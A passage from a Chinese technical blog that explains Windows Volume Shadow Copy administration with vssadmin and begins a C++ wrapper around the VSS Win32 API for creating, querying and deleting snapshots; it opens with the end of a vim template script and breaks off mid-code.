__cplusplus&quot;</span>)</span><br><span class=\"line\">            call append(line(<span class=\"string\">&quot;.&quot;</span>)+13, <span class=\"string\">&quot;extern \\&quot;C\\&quot;&quot;</span>)</span><br><span class=\"line\">            call append(line(<span class=\"string\">&quot;.&quot;</span>)+14, <span class=\"string\">&quot;&#123;&quot;</span>)</span><br><span class=\"line\">            call append(line(<span class=\"string\">&quot;.&quot;</span>)+15, <span class=\"string\">&quot;#endif&quot;</span>)</span><br><span class=\"line\">            call append(line(<span class=\"string\">&quot;.&quot;</span>)+16, <span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">            call append(line(<span class=\"string\">&quot;.&quot;</span>)+17, <span class=\"string\">&quot;#ifdef __cplusplus&quot;</span>)</span><br><span class=\"line\">            call append(line(<span class=\"string\">&quot;.&quot;</span>)+18, <span class=\"string\">&quot;&#125;&quot;</span>)</span><br><span class=\"line\">            call append(line(<span class=\"string\">&quot;.&quot;</span>)+19, <span class=\"string\">&quot;#endif&quot;</span>)</span><br><span class=\"line\">            call append(line(<span class=\"string\">&quot;.&quot;</span>)+20, <span class=\"string\">&quot;#endif //&quot;</span>.toupper(expand(<span class=\"string\">&quot;%:t:r&quot;</span>)).<span class=\"string\">&quot;_H&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        elseif expand(<span class=\"string\">&quot;%:e&quot;</span>) == <span class=\"string\">&#x27;h&#x27;</span></span><br><span class=\"line\">            call append(line(<span class=\"string\">&quot;.&quot;</span>)+10, <span class=\"string\">&quot;#pragma once&quot;</span>)</span><br><span class=\"line\">        elseif &amp;filetype == <span class=\"string\">&#x27;c&#x27;</span></span><br><span class=\"line\">            call append(line(<span class=\"string\">&quot;.&quot;</span>)+10,<span class=\"string\">&quot;#include \\&quot;&quot;</span>.expand(<span class=\"string\">&quot;%:t:r&quot;</span>).<span class=\"string\">&quot;.h\\&quot;&quot;</span>)</span><br><span class=\"line\">        elseif &amp;filetype == <span class=\"string\">&#x27;cpp&#x27;</span></span><br><span class=\"line\">            call append(line(<span class=\"string\">&quot;.&quot;</span>)+10, <span class=\"string\">&quot;#include \\&quot;&quot;</span>.expand(<span class=\"string\">&quot;%:t:r&quot;</span>).<span class=\"string\">&quot;.h\\&quot;&quot;</span>)</span><br><span class=\"line\">        endif</span><br><span class=\"line\">    endif</span><br><span class=\"line\">endfunc</span><br></pre></td></tr></table></figure><br>创建新文件时会自动创建模板</p>\n","tags":["vim"]},{"title":"Windows创建卷影副本","url":"/2023/03/20/Windows%E5%88%9B%E5%BB%BA%E5%8D%B7%E5%BD%B1%E5%89%AF%E6%9C%AC/","content":"<p>Windows Server 2008以上的版本，管理员可以通过卷影副本服务（Volume Shadow Service）在<strong>指定的</strong>卷上创建备份的<strong>卷影副本</strong>。卷影副本类似于快照(Snapshot)，用户可以基于快照卷恢复到之前某个时间的版本，备份软件也可基于快照做一致性备份。因此，它可以极大保护服务器的数据安全。</p>\n<p>本文就介绍VSS相关操作以及如何用C++调用相关API。</p>\n<blockquote>\n<p>项目完整地址见<a href=\"https://github.com/XUranus/Win32VSSWrapper\">https://github.com/XUranus/Win32VSSWrapper</a><br>下文所说的<strong>卷影副本</strong>和<strong>快照</strong>属于一个概念</p>\n</blockquote>\n<h2 id=\"vssadmin卷操作\"><a href=\"#vssadmin卷操作\" class=\"headerlink\" title=\"vssadmin卷操作\"></a>vssadmin卷操作</h2><p>所有支持VSS的Windows系统已经提供了一个管理卷影副本的命令行工具vssadmin。使用<strong>管理员权限</strong>进入cmd，执行卷影副本命令<code>vssadmin</code>，可以看到所有支持的命令：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\WINDOWS\\system32&gt;vssadmin</span><br><span class=\"line\">vssadmin 1.1 - 卷影复制服务管理命令行工具</span><br><span class=\"line\">(C) 版权所有 2001-2013 Microsoft Corp.</span><br><span class=\"line\"></span><br><span class=\"line\">---- 支持的命令 ----</span><br><span class=\"line\"></span><br><span class=\"line\">Delete Shadows        - 删除卷影副本</span><br><span class=\"line\">List Providers        - 列出已注册的卷影副本提供程序</span><br><span class=\"line\">List Shadows          - 列出现有卷影副本</span><br><span class=\"line\">List ShadowStorage    - 列出卷影副本存储关联</span><br><span class=\"line\">List Volumes          - 列出可以进行卷影副本处理的卷</span><br><span class=\"line\">List Writers          - 列出订阅的卷影副本写入程序</span><br><span class=\"line\">Resize ShadowStorage  - 调整卷影副本存储关联的大小</span><br></pre></td></tr></table></figure></p>\n<span id=\"more\"></span>\n<p>这里我们主要讨论副本的创建、删除、查询。首先用<code>vssadmin list shadows</code>列出所有卷影副本：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\WINDOWS\\system32&gt;vssadmin list shadows</span><br><span class=\"line\">vssadmin 1.1 - 卷影复制服务管理命令行工具</span><br><span class=\"line\">(C) 版权所有 2001-2013 Microsoft Corp.</span><br><span class=\"line\"></span><br><span class=\"line\">卷影副本集 ID: &#123;d85162e7-db49-4035-956e-465e1a7f3747&#125; 的内容</span><br><span class=\"line\">   在创建时间: 2023/1/17 13:46:05 含有 1 个卷影副本</span><br><span class=\"line\">      卷影副本 ID: &#123;f8bf1cfc-ddab-47ad-8156-3f1f45f70641&#125;</span><br><span class=\"line\">         原始卷: (C:)\\\\?\\Volume&#123;a501f5cc-311e-423c-bc58-94a6c1b6b509&#125;\\</span><br><span class=\"line\">         卷影副本卷: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1</span><br><span class=\"line\">         源起机器: DESKTOP-TODPNBO</span><br><span class=\"line\">         服务机器: DESKTOP-TODPNBO</span><br><span class=\"line\">         提供程序: &#x27;Microsoft Software Shadow Copy provider 1.0&#x27;</span><br><span class=\"line\">         类型: ClientAccessibleWriters</span><br><span class=\"line\">         属性: 持续, 客户端可访问, 无自动释放, 差异, 自动还原</span><br><span class=\"line\"></span><br><span class=\"line\">卷影副本集 ID: &#123;1abe303d-eb32-445a-ae78-72432980191b&#125; 的内容</span><br><span class=\"line\">   在创建时间: 2023/1/18 23:38:42 含有 1 个卷影副本</span><br><span class=\"line\">      卷影副本 ID: &#123;5fee2842-be4e-4477-86c6-1c0c28221a4f&#125;</span><br><span class=\"line\">         原始卷: (C:)\\\\?\\Volume&#123;a501f5cc-311e-423c-bc58-94a6c1b6b509&#125;\\</span><br><span class=\"line\">         卷影副本卷: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2</span><br><span class=\"line\">         源起机器: DESKTOP-TODPNBO</span><br><span class=\"line\">         服务机器: DESKTOP-TODPNBO</span><br><span class=\"line\">         提供程序: &#x27;Microsoft Software Shadow Copy provider 1.0&#x27;</span><br><span class=\"line\">         类型: ClientAccessibleWriters</span><br><span class=\"line\">         属性: 持续, 客户端可访问, 无自动释放, 差异, 自动还原</span><br></pre></td></tr></table></figure><br><code>vssadmin list shadows</code>可以展开每个副本的详细信息，包含：</p>\n<ul>\n<li>卷影副本ID：这是每个VSS快照的唯一GUID标识符</li>\n<li>卷影副本集ID：一个副本集可以是一个或多个同时创建的快照集合，一个副本集也有一个GUID标识符。一个快照只对应一个副本集，而一个副本集可能会包含多个快照。</li>\n<li>属性：快照可能是持久的、也可能会在创建后一段时间内自动释放。</li>\n</ul>\n<p><code>vssadmin list shadowstorage</code>用于展示所有支持快照的卷的空间分配情况。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\WINDOWS\\system32&gt;vssadmin list shadowstorage</span><br><span class=\"line\">vssadmin 1.1 - 卷影复制服务管理命令行工具</span><br><span class=\"line\">(C) 版权所有 2001-2013 Microsoft Corp.</span><br><span class=\"line\"></span><br><span class=\"line\">卷影副本存储关联</span><br><span class=\"line\">   卷: (C:)\\\\?\\Volume&#123;a501f5cc-311e-423c-bc58-94a6c1b6b509&#125;\\</span><br><span class=\"line\">   卷影副本存储卷: (C:)\\\\?\\Volume&#123;a501f5cc-311e-423c-bc58-94a6c1b6b509&#125;\\</span><br><span class=\"line\">   已用卷影副本存储空间: 1.80 GB (0%)</span><br><span class=\"line\">   分配的卷影副本存储空间: 2.16 GB (0%)</span><br><span class=\"line\">   最大卷影副本存储空间: 4.75 GB (2%)</span><br></pre></td></tr></table></figure></p>\n<p>使用<code>vssadmin add shadowstorage /for=&lt;Volume1&gt; /on=&lt;Volume2&gt;</code>可以创建卷影副本。其中<code>&lt;Volume1&gt;</code>指定了要保护的卷，<code>&lt;Volume2&gt;</code>指定了副本存放的卷。<strong>副本存放的卷可以是要保护的本地卷，也可以是其他卷。</strong>，例如：<br><figure class=\"highlight cmd\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">C:\\<span class=\"title\">WINDOWS</span>\\<span class=\"title\">system32</span>&gt;<span class=\"title\">vssadmin</span> <span class=\"title\">add</span> <span class=\"title\">shadowstorage</span> /<span class=\"title\">for</span>=<span class=\"title\">c</span>: /<span class=\"title\">on</span>=<span class=\"title\">c</span>:</span></span><br></pre></td></tr></table></figure></p>\n<p>每一个创建完成的卷影副本都对应一个ID和设备名，可以根据其设备名创建符号链接来实现挂载。例如将<code>\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2</code>挂载到<code>C:\\Users\\XUranus\\Desktop\\vss1</code>的位置上，该目录可以获得一个只读的文件系统：<br><figure class=\"highlight cmd\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">C:\\<span class=\"title\">WINDOWS</span>\\<span class=\"title\">system32</span>&gt;<span class=\"title\">mklink</span> /<span class=\"title\">d</span> <span class=\"title\">C</span>:\\<span class=\"title\">Users</span>\\<span class=\"title\">XUranus</span>\\<span class=\"title\">Desktop</span>\\<span class=\"title\">vss1</span> \\\\?\\<span class=\"title\">GLOBALROOT</span>\\<span class=\"title\">Device</span>\\<span class=\"title\">HarddiskVolumeShadowCopy2</span></span></span><br><span class=\"line\"><span class=\"function\">为 <span class=\"title\">C</span>:\\<span class=\"title\">Users</span>\\<span class=\"title\">XUranus</span>\\<span class=\"title\">Desktop</span>\\<span class=\"title\">vss1</span> &lt;&lt;===&gt;&gt; \\\\?\\<span class=\"title\">GLOBALROOT</span>\\<span class=\"title\">Device</span>\\<span class=\"title\">HarddiskVolumeShadowCopy2</span> 创建 的符号链接</span></span><br></pre></td></tr></table></figure></p>\n<p>删除快照也是使用卷影副本ID，例如删除之前创建的<code>C:</code>盘下的快照<code>&#123;f8bf1cfc-ddab-47ad-8156-3f1f45f70641&#125;</code><br><figure class=\"highlight cmd\"><table><tr><td class=\"code\"><pre><span class=\"line\">vssadmin delete shadows /<span class=\"keyword\">for</span>=c：/shadow=&#123;f8bf1cfc-ddab-<span class=\"number\">47</span>ad-<span class=\"number\">8156</span>-<span class=\"number\">3</span>f1f45f70641&#125;</span><br></pre></td></tr></table></figure><br>详见<a href=\"https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin-delete-shadows?source=recommendations\">vssadmin delete shadows</a></p>\n<h2 id=\"VSS-Win32-API\"><a href=\"#VSS-Win32-API\" class=\"headerlink\" title=\"VSS Win32 API\"></a>VSS Win32 API</h2><p>调用VSS相关Win32 API需要依赖<code>VssApi.lib</code>，部分低版本的Windows可能需要安装相应的SDK。</p>\n<p>我们将对VSS快照相关Win32 API做一个简单的封装。首先需要引入VSS相关头文件：<code>vss.h</code>、<code>vswriter.h</code>、<code>vsbackup.h</code>。由于VSS API依赖COM库相关结构，还需要包含<code>comdef.h</code><br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// VssClient.h</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> WIN32_LEAN_AND_MEAN</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;objbase.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vss.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vswriter.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vsbackup.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;comdef.h&gt;</span></span></span><br></pre></td></tr></table></figure></p>\n<p>前文用<code>vssadmin</code>列出所有创建的VSS快照，可以看到形如<code>&#123;a501f5cc-311e-423c-bc58-94a6c1b6b509&#125;</code>这样的副本/副本集ID。VSS API使用<code>VSS_ID</code>类型的<strong>结构体</strong>来描述这类ID，它是一种Windows GUID类型。为了减少头文件污染，这里统一用字符串来标记这类ID的字面量。于是首先要提供<code>VSS_ID</code>和<code>std::string</code>的转化操作：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// VssClient.h</span></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * An Util Class, Used to automatically release a CoTaskMemAlloc allocated pointer</span></span><br><span class=\"line\"><span class=\"comment\"> * when the instance of this class goes out of scope（RAII)</span></span><br><span class=\"line\"><span class=\"comment\"> * (even if an exception is thrown)</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CAutoComPointer</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"built_in\">CAutoComPointer</span>(LPVOID ptr): <span class=\"built_in\">m_ptr</span>(ptr) &#123;&#125;;</span><br><span class=\"line\">    ~<span class=\"built_in\">CAutoComPointer</span>() &#123; ::<span class=\"built_in\">CoTaskMemFree</span>(m_ptr); &#125;</span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">    LPVOID m_ptr;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// VssClient.cpp</span></span><br><span class=\"line\"><span class=\"function\">std::optional&lt;std::wstring&gt; <span class=\"title\">VssID2WStr</span><span class=\"params\">(<span class=\"keyword\">const</span> VSS_ID&amp; vssID)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    LPOLESTR wVssIDBuf = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">    <span class=\"function\">CAutoComPointer <span class=\"title\">ptrAutoCleanUp</span><span class=\"params\">(wVssIDBuf)</span></span>;</span><br><span class=\"line\">    HRESULT hr = ::<span class=\"built_in\">StringFromIID</span>(vssID, &amp;wVssIDBuf);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">FAILED</span>(hr)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> std::nullopt;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\">std::wstring <span class=\"title\">wVssIDStr</span><span class=\"params\">(wVssIDBuf)</span></span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> std::make_optional&lt;std::wstring&gt;(wVssIDStr);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">std::optional&lt;VSS_ID&gt; <span class=\"title\">VssIDfromWStr</span><span class=\"params\">(<span class=\"keyword\">const</span> std::wstring&amp; vssIDWstr)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    VSS_ID vssID;</span><br><span class=\"line\">    HRESULT hr = ::<span class=\"built_in\">IIDFromString</span>(vssIDWstr.<span class=\"built_in\">c_str</span>(), &amp;vssID);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">FAILED</span>(hr)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> std::nullopt;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> std::make_optional&lt;VSS_ID&gt;(vssID);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看到这里额外定义了<code>CAutoComPointer</code>类型，因为这里及后续的很多VSS API都会用参数返回堆上分配的空间地址，并要求调用者手动调用<code>::CoTaskMemFree(LPVOID)</code>释放分配的资源，这里用RAII的机制可以有效避免内存泄漏。<code>VSS_ID</code>和<code>std::string</code>的互转是通过<code>::StringFromIID</code>和<code>::IIDFromString</code>实现的。</p>\n<blockquote>\n<p>这两个API都返回<code>HRESULT</code>类型，这是一类Win32错误码返回类型，后续其余VSS API也会相继用到它，可以用<code>FAILED</code>宏判断这类返回值是否成功。<code>HRESULT</code>详见<a href=\"https://learn.microsoft.com/en-us/windows/win32/seccrypto/common-hresult-values\">Common HRESULT Values</a></p>\n</blockquote>\n<p>定义两个和宏<code>CHECK_HR_RETURN</code>和<code>CHECK_BOOL_RETURN</code>来判断操作结果并返回<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// VssClient.cpp</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> CHECK_HR_RETURN(HR, FUNC, RET) \\</span></span><br><span class=\"line\"><span class=\"meta\">    do &#123; \\</span></span><br><span class=\"line\"><span class=\"meta\">        _com_error err(HR); \\</span></span><br><span class=\"line\"><span class=\"meta\">        <span class=\"meta-keyword\">if</span> (HR != S_OK) &#123; \\</span></span><br><span class=\"line\"><span class=\"meta\">            ::fprintf(stderr, <span class=\"meta-string\">&quot;HRESULT Return FAILED, Function: &quot;</span> ## FUNC ## <span class=\"meta-string\">&quot;, Error: %s\\n&quot;</span>, err.ErrorMessage()); \\</span></span><br><span class=\"line\"><span class=\"meta\">            return RET; \\</span></span><br><span class=\"line\"><span class=\"meta\">        &#125; \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#125; \\</span></span><br><span class=\"line\"><span class=\"meta\">    while (0)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> CHECK_BOOL_RETURN(BOOLVALUE, FUNC, RET) \\</span></span><br><span class=\"line\"><span class=\"meta\">    do &#123; \\</span></span><br><span class=\"line\"><span class=\"meta\">        <span class=\"meta-keyword\">if</span> ((!BOOLVALUE)) &#123; \\</span></span><br><span class=\"line\"><span class=\"meta\">            ::fprintf(stderr, <span class=\"meta-string\">&quot;Boolean Return False, Function: &quot;</span> ## FUNC ## <span class=\"meta-string\">&quot;\\n&quot;</span>); \\</span></span><br><span class=\"line\"><span class=\"meta\">            return RET; \\</span></span><br><span class=\"line\"><span class=\"meta\">        &#125; \\</span></span><br><span class=\"line\"><span class=\"meta\">    &#125; \\</span></span><br><span class=\"line\"><span class=\"meta\">    while (0)</span></span><br></pre></td></tr></table></figure></p>\n<p>给出类<code>VssClient</code>的定义：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// VssClient.h</span></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * The class providing snapshot creation/delete/query</span></span><br><span class=\"line\"><span class=\"comment\"> * Not thread-safe</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">VssClient</span> &#123;</span></span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">VssClient::InitializeCom</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">    <span class=\"keyword\">bool</span> m_comInitialized = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    IVssBackupComponents* m_pVssObject = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>VSS API需要依赖一个核心类<code>IVssBackupComponents</code>，所有创建、查询、删除等逻辑都是这个类提供的。在创建<code>IVssBackupComponents</code>之前需要先初始化COM库。COM库初始化详见<a href=\"https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-coinitializeex\">https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-coinitializeex</a></p>\n<p>首先实现COM库的初始化方法和取消初始化方法：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// VssClient.cpp</span></span><br><span class=\"line\"><span class=\"comment\">/* initialzie COM */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">VssClient::InitializeCom</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (m_comInitialized) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    HRESULT hr = ::<span class=\"built_in\">CoInitializeEx</span>(<span class=\"literal\">nullptr</span>, COINIT::COINIT_MULTITHREADED);</span><br><span class=\"line\">    <span class=\"built_in\">CHECK_HR_RETURN</span>(hr, <span class=\"string\">&quot;CoInitializeEx&quot;</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\">    m_comInitialized = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    hr = <span class=\"built_in\">CoInitializeSecurity</span>(</span><br><span class=\"line\">        <span class=\"literal\">NULL</span>,                           <span class=\"comment\">//  Allow *all* VSS writers to communicate back!</span></span><br><span class=\"line\">        <span class=\"number\">-1</span>,                             <span class=\"comment\">//  Default COM authentication service</span></span><br><span class=\"line\">        <span class=\"literal\">NULL</span>,                           <span class=\"comment\">//  Default COM authorization service</span></span><br><span class=\"line\">        <span class=\"literal\">NULL</span>,                           <span class=\"comment\">//  reserved parameter</span></span><br><span class=\"line\">        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,  <span class=\"comment\">//  Strongest COM authentication level</span></span><br><span class=\"line\">        RPC_C_IMP_LEVEL_IMPERSONATE,    <span class=\"comment\">//  Minimal impersonation abilities </span></span><br><span class=\"line\">        <span class=\"literal\">NULL</span>,                           <span class=\"comment\">//  Default COM authentication settings</span></span><br><span class=\"line\">        EOAC_DYNAMIC_CLOAKING,          <span class=\"comment\">//  Cloaking</span></span><br><span class=\"line\">        <span class=\"literal\">NULL</span>                            <span class=\"comment\">//  Reserved parameter</span></span><br><span class=\"line\">    );</span><br><span class=\"line\">    <span class=\"built_in\">CHECK_HR_RETURN</span>(hr, <span class=\"string\">&quot;CoInitializeSecurity&quot;</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">VssClient::UninitializeCom</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!m_comInitialized) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ::<span class=\"built_in\">CoUninitialize</span>();</span><br><span class=\"line\">    m_comInitialized = <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>由于所有VSS操作都需要在初始化COM库后进行，在<code>VssClient</code>构造时就执行相关操作，并在析构时取消初始化并析构<code>IVssBackupComponents* m_pVssObject</code><br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// VssClient.cpp</span></span><br><span class=\"line\">VssClient::<span class=\"built_in\">VssClient</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">InitializeCom</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">VssClient::~<span class=\"built_in\">VssClient</span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (m_pVssObject != <span class=\"literal\">nullptr</span>) &#123;</span><br><span class=\"line\">        m_pVssObject-&gt;<span class=\"built_in\">Release</span>();</span><br><span class=\"line\">        m_pVssObject = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">UninitializeCom</span>();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>之前说到VSS操作依赖一个核心类<code>IVssBackupComponents</code>实现，这里我们将其指针作为<code>VssClient</code>的成员，在<code>InitializeVssComponent()</code>中使用API<code>CreateVssBackupComponents()</code>初始化，由于每种VSS操作（创建、删除、查询）可能需要用到不同的上下文，而<code>IVssBackupComponents* m_pVssObject</code>指向唯一的上下文，所以每次操作我们选择用其<code>Release()</code>方法释放资源，再重新创建实例：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// VssClient.cpp</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">VssClient::InitializeVssComponent</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (m_pVssObject != <span class=\"literal\">nullptr</span>) &#123;</span><br><span class=\"line\">        m_pVssObject-&gt;<span class=\"built_in\">Release</span>();</span><br><span class=\"line\">        m_pVssObject = <span class=\"literal\">nullptr</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    HRESULT hr = ::<span class=\"built_in\">CreateVssBackupComponents</span>(&amp;m_pVssObject);</span><br><span class=\"line\">    <span class=\"built_in\">CHECK_HR_RETURN</span>(hr, <span class=\"string\">&quot;CreateVssBackupComponents&quot;</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>由于每次操作VSS需要不同的上下文，这里定义一个<code>InitializeBackupContect(const VSS_SNAPSHOT_CONTEXT&amp; context)</code>方法用于依据不同上下文初始化对应的<code>IVssBackupComponents</code>实例并设置其上下文：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// VssClient.cpp</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">bool</span> <span class=\"title\">VssClient::InitializeBackupContect</span><span class=\"params\">(<span class=\"keyword\">const</span> VSS_SNAPSHOT_CONTEXT&amp; context)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">CHECK_BOOL_RETURN</span>(<span class=\"built_in\">InitializeVssComponent</span>(), <span class=\"string\">&quot;InitializeVssComponent&quot;</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    HRESULT hr = m_pVssObject-&gt;<span class=\"built_in\">InitializeForBackup</span>();</span><br><span class=\"line\">    <span class=\"built_in\">CHECK_HR_RETURN</span>(hr, <span class=\"string\">&quot;InitializeForBackup&quot;</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    hr = m_pVssObject-&gt;<span class=\"built_in\">SetContext</span>(context);</span><br><span class=\"line\">    <span class=\"built_in\">CHECK_HR_RETURN</span>(hr, <span class=\"string\">&quot;SetContext&quot;</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    hr = m_pVssObject-&gt;<span class=\"built_in\">SetBackupState</span>(<span class=\"literal\">true</span>, <span class=\"literal\">false</span>, VSS_BT_FULL, <span class=\"literal\">false</span>);</span><br><span class=\"line\">    <span class=\"built_in\">CHECK_HR_RETURN</span>(hr, <span class=\"string\">&quot;SetBackupState&quot;</span>, <span class=\"literal\">false</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>好了，至此我们已经完成了核心类<code>IVssBackupComponents</code>实例的创建与初始化，接下来就是封装VSS的集中操作了。</p>\n<p>创建快照的步骤如下：</p>\n<ol>\n<li>先用<code>IVssBackupComponents::StartSnapshotSet</code>初始化一个卷影副本集，获取副本集ID</li>\n<li>然后用<code>IVssBackupComponents::AddToSnapshotSet</code>依次传入要打快照的卷对应的驱动器路径</li>\n<li>然后<code>IVssBackupComponents::PrepareForBackup</code>准备创建快照需要的资源</li>\n<li>最后<code>IVssBackupComponents::DoSnapshotSet</code>为每个卷生成卷影副本，每个卷影副本对应唯一的副本ID，它们属于共同的卷影副本集</li>\n</ol>\n<p>创建快照实现如下：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// VssClient.cpp</span></span><br><span class=\"line\"><span class=\"function\">std::optional&lt;SnapshotSetResult&gt; <span class=\"title\">VssClient::CreateSnapshotsW</span><span class=\"params\">(<span class=\"keyword\">const</span> std::vector&lt;std::wstring&gt;&amp; wVolumePathList)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span 